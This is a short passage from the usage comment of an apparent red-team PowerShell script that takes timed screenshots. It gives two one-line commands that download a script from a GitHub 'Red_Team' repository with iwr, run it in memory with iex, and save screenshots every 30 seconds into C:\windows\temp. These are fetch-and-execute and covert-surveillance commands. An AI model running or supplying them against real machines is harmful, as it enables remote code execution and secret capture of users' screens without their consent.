...
<#
.USAGE
iex (iwr https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Take_ScreenShot_Timed.ps1);Get-TimedScreenshot -path C:\windows\temp\ -interval 30 -EndTime 11:53
OR
powershell.exe "iex (iwr https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Take_ScreenShot_Timed.ps1);Get-TimedScreenshot -path C:\windows\temp\ -interval 30 -EndTime 14:00"
